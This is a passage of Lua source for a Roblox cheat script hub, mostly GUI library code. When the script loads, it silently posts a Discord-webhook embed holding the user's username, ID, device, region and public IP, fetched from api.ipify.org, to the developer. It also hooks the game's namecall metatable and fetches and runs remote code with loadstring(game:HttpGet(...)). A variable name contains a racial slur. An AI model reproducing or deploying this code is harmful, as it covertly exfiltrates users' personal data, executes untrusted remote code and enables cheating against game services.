	    ["value"] = "```\n• Turtle version: V4 ( latest version )\n• Script type: Free\n• Key system: False\n• Script System ID: {sys.id}\n• Service ID: {Service.id}\n• Bypass version: V8 ( Vanguard )\n• Webhook version: V16.7.2\n• Brutal bypasser: False ( 0 anti-cheat detected )\n```"
        },
	{
	    ["name"] = "Account",
	    ["value"] = "```\n• Username: " .. LocalPlayer.Name .. "\n• Displayname: " .. LocalPlayer.DisplayName .. "\n• ID: " .. LocalPlayer.UserId .. "\n• Join date: null" -- .. jds() .. "\n• Account Age: " .. LocalPlayer.AccountAge .. "\n```"
        },
	{
	    ["name"] = "Client Information",
	    ["value"] = "```\n• Voice chat enabled: " .. vcenab() .. "\n• FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n• Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n• Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n• Exploit: " .. Exploit() .. "\n• Device: " .. DeviceInfo() .. "\n• User region: " .. Virtual_Region() .. "\n• Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
	}
},
    ["footer"] = {
        ["text"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " ) | " .. tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region()
    }
}

task.spawn(function()
	local f,c = pcall(function()
		if LocalPlayer.Name ~= "Rivanda_Cheater" then
			SendMessage(url,"<@955564914028716043>")
			SendMessageEMBED(url,embed)
		end
	end)
	if not f then
		print(c)
	end
end)

function lib:hooksend(str)
	local f,c = pcall(function()
		if LocalPlayer.Name ~= "Rivanda_Cheater" then
			SendMessage(conflog,str)
		end
	end)
	if not f then
		print(c)
	end
end

function lib:children(path,f)
	for i,v in pairs(path:GetChildren()) do
		f(v)
	end
end

function lib:descendant(path,f)
	for i,v in pairs(path:GetDescendants()) do
		f(v)
	end
end

function lib:attributes(path,f)
	for i,v in pairs(path:GetAttributes()) do
		f(i,v)
	end
end

function lib:attribute(path,name)
	return path:GetAttribute(name)
end

local spyembed = {
    ["title"] = "Successfully warned '" .. LocalPlayer.DisplayName .. "'",
    ["description"] = "Webhook from VSP [ Vanguard Script Protection ]",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Reason",
            ["value"] = '```\nHttpSpy\n```'
	}
	--[[{
            ["name"] = "Warn method",
            ["value"] = '```\n\n```'
	}]]
},
    ["footer"] = {
        ["text"] = "Warn code: " .. GUID
    }
}

--[[local function antispy()
for i, v in next,expfunctions do
    local old = hookfunction(v,newcclosure(function(...)
                local args = {...}
                for i,v in next,args do
                    if tostring(i):find("https") or tostring(v):find("https") then
                        SendMessageEMBED(spylog,spyembed)
			SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
			lib:WarnUser("VSP [ Vanguard Script Protection ]\nVanguard has detected http spy, please turn off http spy to continue using this script.",{AutoClose = true,CanClick = false,Duration = 9e9})
		    else
			SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
                    end
                end
                return old(...)
            end))
end
end

if _G.ID then
    while true do
    end
end
setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
                while true do
                end
            end
        end
    }
)
]]

local server = {
	dc = false,
	quote = {"Fahri never asking for a code","Vanguard was developed by Turtle Secure","Vanguard ✘ Roblox? 😲","Alya is the most beautiful woman 🎉","We wont share ur Personal Information","Only turtle can bypass adonis","rgb bar mean that feature is special"}
} -- server.quote

local function dcfunc()
	if server.dc == true then
		lib:notify(lib:ColorFonts(":18729: attempt to index nil with 'TurtleSetPanelFlag'","Red"),20)
	end
end

local function rotate(arraynumber,funct)
	task.spawn(function()
		for array = 1,arraynumber do
			funct(array)
		end
	end)
end

function lib:runtime(funct)
	task.spawn(function()
		while wait() do
			funct()
		end
	end)
end

local emoji = ({
	["01 01"] = lib:ColorFonts("🎆 NEW YEAR 🎆","Bright Blue"),
	[(function(Year)
		local A = math.floor(Year/100)
		local B = math.floor((13+8*A)/25)
		local C = (15-B+A-math.floor(A/4))%30
		local D = (4+A-math.floor(A/4))%7
		local E = (19*(Year%19)+C)%30
		local F = (2*(Year%4)+4*(Year%7)+6*E+D)%7
		local G = (22+E+F)
		if E == 29 and F == 6 then
			return "04 19"
		elseif E == 28 and F == 6 then
			return "04 18"
		elseif 31 < G then
			return ("04 %02d"):format(G-31)
		end
		return ("03 %02d"):format(G)
	end)(tonumber(os.date("%Y")))] = lib:ColorFonts("🐰🥚 EASTER 🥚🐰","Sky Blue"),
	["10 31"] = lib:ColorFonts("🎃 HALLOWEEN 🎃","Gold"),
	["12 25"] = lib:ColorFonts("🎄 CHRISTMAS 🎄","Green"),
	["04 10"] = lib:ColorFonts("EID UL FITRI","Light Green"),
	["04 11"] = lib:ColorFonts("EID UL FITRI","Light Green"),
	["03 29"] = lib:ColorFonts("💞🎂 FAHRI'S GF'S BIRTHDAY 🎂💞","Pink"),
	["01 29"] = lib:ColorFonts("🎂 FAHRI'S BIRTHDAY 🎂","Yellow"),
	["01 10"] = lib:ColorFonts("🎂 ASYA'S BIRTHDAY 🎂","Pink"),
	["05 05"] = lib:ColorFonts("🎂 AKBAR'S BIRTHDAY 🎂","Green"),
	["04 12"] = lib:ColorFonts("🎉 TURTLE HUB ANNIVERSARY 🎉","Sky Blue"),
	["04 15"] = lib:ColorFonts("🎉 VANGUARD ANNIVERSARY 🎉","Red"),
	["02 14"] = lib:ColorFonts("💕 VALENTINE'S DAY 💕","Pink"),
	["03 08"] = lib:ColorFonts("👸🏻 INTERNATIONAL WOMEN'S DAY 👸🏻","Pink"),
	["04 01"] = lib:ColorFonts("❌ LAST UPDATE ❌","Red"),
	["05 01"] = lib:ColorFonts("🔪 INTERNATIONAL LABOR DAY 🔪","Red"),
	["08 17"] = lib:ColorFonts("🇮🇩 INDONESIA'S INDEPENDENCE DAY 🇮🇩","Red")
})[os.date("%m %d")] --Light Green

local THHUI = Instance.new("ScreenGui")
THHUI.Name = "VIP TURTLE HUB HIDE UI"
THHUI.Parent = game:GetService("CoreGui")
THHUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local HIDEUINIGGER = Instance.new("Frame")
HIDEUINIGGER.Size = UDim2.new(0.5,0,0.1,0) --UDim2.new(0,200,0,150)
HIDEUINIGGER.Position = UDim2.new(0.5,0,0,0) --UDim2.new(0.5,-100,0.5,-75)
HIDEUINIGGER.BackgroundColor3 = Color3.fromRGB(255,255,255)
HIDEUINIGGER.Parent = THHUI
HIDEUINIGGER.BackgroundTransparency = 1
--Title.Rotation = 90
local rotation = 0

function lib:HookFunction(func)
        local mt = getrawmetatable(game);
        setreadonly(mt,false)
        local namecall = mt.__namecall

        mt.__namecall = newcclosure(function(self, ...)
	        local Method = getnamecallmethod()
	        local Args = {...}
                func(Method,self.Name,Args)
	        return namecall(self, ...) 
        end)
end

function lib:HookCalled(func)
	local gmt = getrawmetatable(game)
        setreadonly(gmt, false)
        local oldNamecall = gmt.__namecall
        gmt.__namecall = newcclosure(function(self, ...)
                local Args = {...}
                local method = getnamecallmethod()
		if method == "FireServer" then
			func(self,Args)
		elseif method == "InvokeServer" then
			func(self,Args)
		end
        return oldNamecall(self, ...)
        end)
end
		
function lib:AddTable(gameservice,tbl)
	for i,v in pairs(gameservice:GetChildren()) do
		table.insert(tbl,v.Name)
	end
end

function lib:ErrorReader(func)
	local shit,dick = pcall(function()
		func()
	end)
	if not shit then
		lib:notify(lib:ColorFonts(dick,"Red"),10)
	end
end

function lib:SpyFunction(funct)
	lib:ErrorReader(function()
		local env = getfenv(1)
		local mt = getmetatable(env) or {}
		mt.__index = function(tbl,key,...)
			local args = {...}
			funct("Called function : " .. key .. "\nArguments: " .. table.concat(args,", ") .. "\nNumber of arguments : " .. select("#",...) .. "\nCalled from : " .. debug.traceback())
		return rawget(tbl,key)
		end
		setmetatable(env,mt)
	end)
end

function lib:synapse(bool)
	lib:ErrorReader(function()
		rd3Exploit:ShowThird(bool)
	end)
end

function lib:FireTouch(gameservice)
	for i,v in pairs(gameservice:GetDescendants()) do
		if v:IsA("TouchInterest") or v:IsA("TouchTransmitter") then
			firetouchinterest(v,LocalPlayer.Character.HumanoidRootPart,0)
			wait()
			firetouchinterest(v,LocalPlayer.Character.HumanoidRootPart,1)
		end
	end
end

function lib:RemoteSpy()
	local isrun,iserror = pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/modified-remote-spy/main/.lua"))()
	end)
	if not isrun then
		lib:WarnUser(lib:ColorFonts(iserror,"Red"))
		lib:hooksend("RemoteSpy error: \n```\n" .. iserror .. "\n```")
	end
end

function lib:Serverhop(val)
    local x = {}
    local vartbl = val or "normal"
    if vartbl == "normal" then
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    else
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.playing < val and v.id ~= game.JobId then --v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    end
    if #x > 0 then
        TeleportService:TeleportToPlaceInstance(game.PlaceId,x[math.random(1,#x)])
    else
        lib:notify(lib:ColorFonts("Cannot find a server","Red"),10)
    end
end
 
function lib:CheckServers(n,funct)
    local x = {}
    local tgh = false
    local chck = n or "normal"
    if chck == "normal" then
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    else
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.playing < chck and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    end
    if #x > 0 then
        tgh = true
    else
        tgh = false
    end
	funct(tgh)
end

--[[
lib:CheckServers(3,function(vuln)
if vuln == true then
lib:Serverhop(3)
end
end)
lib:rejoin()
]]

function lib:rejoin()
    if #game.Players:GetPlayers() <= 1 then
        TeleportService:Teleport(game.PlaceId,LocalPlayer)
    else
        TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
    end
end

function lib:FormatRGB(str)
	if str == "rgb" then
		return Color3.fromRGB(math.floor(((math.sin(workspace.DistributedGameTime/2)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime*1.5)/2)+0.5)*255))
	elseif str == "gradient" then
		return ColorSequence.new{
			ColorSequenceKeypoint.new(0,Color3.fromRGB(
					math.floor(((math.sin(workspace.DistributedGameTime / 2) / 2) + 0.5) * 255),
					math.floor(((math.sin(workspace.DistributedGameTime) / 2) + 0.5) * 255),
					math.floor(((math.sin(workspace.DistributedGameTime * 1.5) / 2) + 0.5) * 255)
			)),
			ColorSequenceKeypoint.new(1,Color3.fromRGB(
					math.floor(((math.sin(workspace.DistributedGameTime / 2) / 2) + 0.5) * 255),
					math.floor(((math.sin(workspace.DistributedGameTime) / 2) + 0.5) * 255),
					math.floor(((math.sin(workspace.DistributedGameTime * 1.5) / 2) + 0.5) * 255)
			))
		}
	end
end
--lib:FormatRGB("gradient")
function lib:Window(text, preset, closebind)
    CloseBind = closebind or Enum.KeyCode.RightControl
    PresetColor = preset or Color3.fromRGB(0, 255, 0)
    fs = false
    local Main = Instance.new("Frame")
    local TabHold = Instance.new("ScrollingFrame")
    local TabHoldLayout = Instance.new("UIListLayout")
    local Title = Instance.new("TextLabel")
    local TabFolder = Instance.new("Folder")
    local DragFrame = Instance.new("Frame")
    local UICorner_hide = Instance.new("UICorner")
	
    Main.Name = "Main"
    Main.Parent = ui
    Main.AnchorPoint = Vector2.new(0.5, 0.5)
    Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Main.BorderSizePixel = 0
    Main.Position = UDim2.new(0.5, 0, 0.5, 0)
    Main.Size = UDim2.new(0, 0, 0, 0)
    Main.ClipsDescendants = true
    Main.Visible = true

    TabHold.Name = "TabHold"
    TabHold.Parent = Main
    TabHold.Active = true
    TabHold.BackgroundColor3 = Color3.fromRGB(255,255,255)
    TabHold.BackgroundTransparency = 1.000
    TabHold.BorderSizePixel = 0
    TabHold.Position = UDim2.new(0.0339285731,0,0.147335425,0)
    TabHold.Size = UDim2.new(0,107,0,254)
    TabHold.CanvasSize = UDim2.new(0,0,0,0)
    TabHold.ScrollBarThickness = 3
    TabHoldLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		TabHold.CanvasSize = UDim2.new(0,0,0,TabHoldLayout.AbsoluteContentSize.Y + 16)
    end)
	
    TabHoldLayout.Name = "TabHoldLayout"
    TabHoldLayout.Parent = TabHold
    TabHoldLayout.SortOrder = Enum.SortOrder.LayoutOrder
    TabHoldLayout.Padding = UDim.new(0, 11)

    Title.Name = "Title"
    Title.Parent = Main
    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Title.BackgroundTransparency = 1.000
    Title.Position = UDim2.new(0.0339285731, 0, 0.0564263314, 0)
    Title.Size = UDim2.new(0, 200, 0, 23)
    Title.Font = Enum.Font.GothamSemibold
    Title.Text = text:gsub("VIP Turtle Hub V4",lib:ColorFonts("VIP Turtle Hub V4","White")):gsub(text:sub(18,#text),"")
    Title.TextColor3 = Color3.fromRGB(68,68,68)
    Title.TextSize = 12.000
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.RichText = true --"Alya is the most beautiful woman 🎉"
    if emoji then
	Title.Text = ("%s | %s"):format(Title.Text,emoji) -- VIP Turtle Hub V4 (17)
	lib:notify("Current event : " .. emoji,10)
    else
	lib:runtime(function()
		Title.Text = lib:ColorFonts("VIP Turtle Hub V4","White") .. " | " .. lib:ColorFonts(tonumber(string.split(Stats["Network"]["ServerStatsItem"]["Data Ping"]:GetValueString()," ")[1]) .. "ms - " .. math.floor(workspace:GetRealPhysicsFPS()) .. "/s - " .. math.round(Stats.GetTotalMemoryUsageMb(Stats)) .. " MB","Royal Blue")
	end)
    end
	
    DragFrame.Name = "DragFrame"
    DragFrame.Parent = Main
    DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    DragFrame.BackgroundTransparency = 1.000
    DragFrame.Size = UDim2.new(0, 560, 0, 41)
	
    local OpenHideUI = Instance.new("TextButton")
    OpenHideUI.Size = UDim2.new(0.5,0,1,0)
    OpenHideUI.Position = UDim2.new(0.5,0,0,0)
    OpenHideUI.Text = "HIDE UI"
    OpenHideUI.Parent = HIDEUINIGGER
    OpenHideUI.BackgroundTransparency = 0.7
    OpenHideUI.TextTransparency = 0
    OpenHideUI.Draggable = true
    UICorner_hide.CornerRadius = UDim.new(.1,0)
    UICorner_hide.Parent = OpenHideUI
    lib:runtime(function()
		OpenHideUI.BackgroundColor3 = Color3.fromRGB(math.floor(((math.sin(workspace.DistributedGameTime/2)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime*1.5)/2)+0.5)*255))
    end)
	
    Main:TweenSize(UDim2.new(0, 560, 0, 319), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)

    MakeDraggable(DragFrame, Main)

    local uitoggled = false
    local MobileToggled = false
    UserInputService.InputBegan:Connect(function(io, p)
            if io.KeyCode == CloseBind then
                if uitoggled == false then
                    uitoggled = true
                    OpenHideUI.Text = "SHOW UI"
		    RevokeLag()
                    Main:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
                            ui.Enabled = false
                   end)
                else
                    uitoggled = false
                    ui.Enabled = true
                    OpenHideUI.Text = "HIDE UI"
		    RevokeLag()
                    Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
                end
            end
        end)

	OpenHideUI.MouseButton1Click:Connect(function()
		if MobileToggled == false then
			MobileToggled = true
			uitoggled = true
			OpenHideUI.Text = "SHOW UI"
			--RevokeLag()
			Main:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
                            ui.Enabled = false
                        end)
		else
			MobileToggled = false 
			uitoggled = false
			ui.Enabled = true
			OpenHideUI.Text = "HIDE UI"
			--RevokeLag()
			Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
		end
	end)
	
    TabFolder.Name = "TabFolder"
    TabFolder.Parent = Main

    function lib:ChangePresetColor(toch)
        PresetColor = toch
    end
	
    function lib:Notification(texttitle, textdesc, textbtn)
        local NotificationHold = Instance.new("TextButton")
        local NotificationFrame = Instance.new("Frame")
        local OkayBtn = Instance.new("TextButton")
        local OkayBtnCorner = Instance.new("UICorner")
        local OkayBtnTitle = Instance.new("TextLabel")
        local NotificationTitle = Instance.new("TextLabel")
        local NotificationDesc = Instance.new("TextLabel")

        NotificationHold.Name = "NotificationHold"
        NotificationHold.Parent = Main
        NotificationHold.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        NotificationHold.BackgroundTransparency = 1.000
        NotificationHold.BorderSizePixel = 0
        NotificationHold.Size = UDim2.new(0, 560, 0, 319)
        NotificationHold.AutoButtonColor = false
        NotificationHold.Font = Enum.Font.SourceSans
        NotificationHold.Text = ""
        NotificationHold.TextColor3 = Color3.fromRGB(0, 0, 0)
        NotificationHold.TextSize = 14.000
        NotificationHold.RichText = true
		
        TweenService:Create(
            NotificationHold,
            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 0.7}
        ):Play()
        wait(0.4)

        NotificationFrame.Name = "NotificationFrame"
        NotificationFrame.Parent = NotificationHold
        NotificationFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        NotificationFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        NotificationFrame.BorderSizePixel = 0
        NotificationFrame.ClipsDescendants = true
        NotificationFrame.Position = UDim2.new(0.5, 0, 0.498432577, 0)

        NotificationFrame:TweenSize(
            UDim2.new(0, 164, 0, 193),
            Enum.EasingDirection.Out,
            Enum.EasingStyle.Quart,
            .6,
            true
        )

        OkayBtn.Name = "OkayBtn"
        OkayBtn.Parent = NotificationFrame
        OkayBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
        OkayBtn.Position = UDim2.new(0.0609756112, 0, 0.720207274, 0)
        OkayBtn.Size = UDim2.new(0, 144, 0, 42)
        OkayBtn.AutoButtonColor = false
        OkayBtn.Font = Enum.Font.SourceSans
        OkayBtn.Text = ""
        OkayBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        OkayBtn.TextSize = 14.000

        OkayBtnCorner.CornerRadius = UDim.new(0, 5)
        OkayBtnCorner.Name = "OkayBtnCorner"
        OkayBtnCorner.Parent = OkayBtn

        OkayBtnTitle.Name = "OkayBtnTitle"
        OkayBtnTitle.Parent = OkayBtn
        OkayBtnTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        OkayBtnTitle.BackgroundTransparency = 1.000
        OkayBtnTitle.Position = UDim2.new(0.0763888881, 0, 0, 0)
        OkayBtnTitle.Size = UDim2.new(0, 181, 0, 42)
        OkayBtnTitle.Font = Enum.Font.Gotham
        OkayBtnTitle.Text = textbtn
        OkayBtnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        OkayBtnTitle.TextSize = 14.000
        OkayBtnTitle.TextXAlignment = Enum.TextXAlignment.Left
        OkayBtnTitle.RichText = true
		
        NotificationTitle.Name = "NotificationTitle"
        NotificationTitle.Parent = NotificationFrame
        NotificationTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        NotificationTitle.BackgroundTransparency = 1.000
        NotificationTitle.Position = UDim2.new(0.0670731738, 0, 0.0829015523, 0)
        NotificationTitle.Size = UDim2.new(0, 143, 0, 26)
        NotificationTitle.Font = Enum.Font.Gotham
        NotificationTitle.Text = texttitle
        NotificationTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        NotificationTitle.TextSize = 18.000
        NotificationTitle.TextXAlignment = Enum.TextXAlignment.Left
        NotificationTitle.RichText = true
		
        NotificationDesc.Name = "NotificationDesc"
        NotificationDesc.Parent = NotificationFrame
        NotificationDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        NotificationDesc.BackgroundTransparency = 1.000
        NotificationDesc.Position = UDim2.new(0.0670000017, 0, 0.218999997, 0)
        NotificationDesc.Size = UDim2.new(0, 143, 0, 91)
        NotificationDesc.Font = Enum.Font.Gotham
        NotificationDesc.Text = textdesc
        NotificationDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
        NotificationDesc.TextSize = 15.000
        NotificationDesc.TextWrapped = true
        NotificationDesc.TextXAlignment = Enum.TextXAlignment.Left
        NotificationDesc.TextYAlignment = Enum.TextYAlignment.Top
        NotificationDesc.RichText = true
		
        OkayBtn.MouseEnter:Connect(
            function()
                TweenService:Create(
                    OkayBtn,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                ):Play()
            end
        )

        OkayBtn.MouseLeave:Connect(
            function()
                TweenService:Create(
                    OkayBtn,
                    TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
                ):Play()
            end
        )

        OkayBtn.MouseButton1Click:Connect(
            function()
                NotificationFrame:TweenSize(
                    UDim2.new(0, 0, 0, 0),
                    Enum.EasingDirection.Out,
                    Enum.EasingStyle.Quart,
                    .6,
                    true
                )

                wait(0.4)

                TweenService:Create(
                    NotificationHold,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 1}
                ):Play()

                wait(.3)

                NotificationHold:Destroy()
            end
        )
    end

    local tabhold = {}
    function tabhold:Tab(text,srgb)
        local TabBtn = Instance.new("TextButton")
        local TabTitle = Instance.new("TextLabel")
        local TabBtnIndicator = Instance.new("Frame")
        local TabBtnIndicatorCorner = Instance.new("UICorner")
        local isrgb = srgb or false
		
        TabBtn.Name = "TabBtn"
        TabBtn.Parent = TabHold
        TabBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabBtn.BackgroundTransparency = 1.000
        TabBtn.Size = UDim2.new(0, 107, 0, 21)
        TabBtn.Font = Enum.Font.SourceSans
        TabBtn.Text = ""
        TabBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        TabBtn.TextSize = 14.000

        TabTitle.Name = "TabTitle"
        TabTitle.Parent = TabBtn
        TabTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabTitle.BackgroundTransparency = 1.000
        TabTitle.Size = UDim2.new(0, 107, 0, 21)
        TabTitle.Font = Enum.Font.Gotham
        TabTitle.Text = text
        TabTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
        TabTitle.TextSize = 14.000
        TabTitle.TextXAlignment = Enum.TextXAlignment.Left
        TabTitle.RichText = true
	if isrgb == true then
		local UIGradient = Instance.new("UIGradient")
		UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,255))}
		UIGradient.Rotation = 90
		UIGradient.Parent = TabTitle
	end
		
        TabBtnIndicator.Name = "TabBtnIndicator"
        TabBtnIndicator.Parent = TabBtn
        TabBtnIndicator.BackgroundColor3 = PresetColor
        TabBtnIndicator.BorderSizePixel = 0
        TabBtnIndicator.Position = UDim2.new(0, 0, 1, 0)
        TabBtnIndicator.Size = UDim2.new(0, 0, 0, 2)

        TabBtnIndicatorCorner.Name = "TabBtnIndicatorCorner"
        TabBtnIndicatorCorner.Parent = TabBtnIndicator
        
        lib:runtime(function()
		if isrgb == true then
			TabBtnIndicator.BackgroundColor3 = lib:FormatRGB("rgb")
			TabTitle.UIGradient.Color = lib:FormatRGB("gradient")
		else
			TabBtnIndicator.BackgroundColor3 = PresetColor
		end
	end)
		
        local Tab = Instance.new("ScrollingFrame")
        local TabLayout = Instance.new("UIListLayout")

        Tab.Name = "Tab"
        Tab.Parent = TabFolder
        Tab.Active = true
        Tab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Tab.BackgroundTransparency = 1.000
        Tab.BorderSizePixel = 0
        Tab.Position = UDim2.new(0.31400001, 0, 0.147, 0)
        Tab.Size = UDim2.new(0, 373, 0, 254)
        Tab.CanvasSize = UDim2.new(0, 0, 0, 0)
        Tab.ScrollBarThickness = 3
        Tab.Visible = false

        TabLayout.Name = "TabLayout"
        TabLayout.Parent = Tab
        TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
        TabLayout.Padding = UDim.new(0,6)
		
        if fs == false then
            fs = true
            TabBtnIndicator.Size = UDim2.new(0, 13, 0, 2)
            TabTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            Tab.Visible = true
        end

        TabBtn.MouseButton1Click:Connect(
            function()
                for i, v in next, TabFolder:GetChildren() do
                    if v.Name == "Tab" then
                        v.Visible = false
                    end
                    Tab.Visible = true
                end
                for i, v in next, TabHold:GetChildren() do
                    if v.Name == "TabBtn" then
                        v.TabBtnIndicator:TweenSize(
                            UDim2.new(0, 0, 0, 2),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TabBtnIndicator:TweenSize(
                            UDim2.new(0, 13, 0, 2),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TweenService:Create(
                            v.TabTitle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {TextColor3 = Color3.fromRGB(150, 150, 150)}
                        ):Play()
                        TweenService:Create(
                            TabTitle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {TextColor3 = Color3.fromRGB(255, 255, 255)}
                        ):Play()
                    end
                end
            end
        )

        
		
        local tabcontent = {}
        function tabcontent:Button(text, callback)
            local Button = Instance.new("TextButton")
            local ButtonCorner = Instance.new("UICorner")
            local ButtonTitle = Instance.new("TextLabel")

            Button.Name = "Button"
            Button.Parent = Tab
            Button.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Button.Size = UDim2.new(0, 363, 0, 42)
            Button.AutoButtonColor = false
            Button.Font = Enum.Font.SourceSans
            Button.Text = ""
            Button.TextColor3 = Color3.fromRGB(0, 0, 0)
            Button.TextSize = 14.000

            ButtonCorner.CornerRadius = UDim.new(0, 5)
            ButtonCorner.Name = "ButtonCorner"
            ButtonCorner.Parent = Button

            ButtonTitle.Name = "ButtonTitle"
            ButtonTitle.Parent = Button
            ButtonTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ButtonTitle.BackgroundTransparency = 1.000
            ButtonTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            ButtonTitle.Size = UDim2.new(0, 187, 0, 42)
            ButtonTitle.Font = Enum.Font.Gotham
            ButtonTitle.Text = text
            ButtonTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ButtonTitle.TextSize = 14.000
            ButtonTitle.TextXAlignment = Enum.TextXAlignment.Left
            ButtonTitle.RichText = true
			
            Button.MouseEnter:Connect(
                function()
                    TweenService:Create(
                        Button,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                    ):Play()
                end
            )

            Button.MouseLeave:Connect(
                function()
                    TweenService:Create(
                        Button,
                        TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
                    ):Play()
                end
            )

            Button.MouseButton1Click:Connect(function()
		if server.dc == true then
			dcfunc()
		else
			lib:ErrorReader(function()
				pcall(callback)
			end)
		end
            end)

            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
        end
	
        function tabcontent:Toggle(text,default,callback)
            local toggled = false
	    local asslabel = {}

            local Toggle = Instance.new("TextButton")
            local ToggleCorner = Instance.new("UICorner")
            local ToggleTitle = Instance.new("TextLabel")
            local FrameToggle1 = Instance.new("Frame")
            local FrameToggle1Corner = Instance.new("UICorner")
            local FrameToggle2 = Instance.new("Frame")
            local FrameToggle2Corner = Instance.new("UICorner")
            local FrameToggle3 = Instance.new("Frame")
            local FrameToggle3Corner = Instance.new("UICorner")
            local FrameToggleCircle = Instance.new("Frame")
            local FrameToggleCircleCorner = Instance.new("UICorner")

            Toggle.Name = "Toggle"
            Toggle.Parent = Tab
            Toggle.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
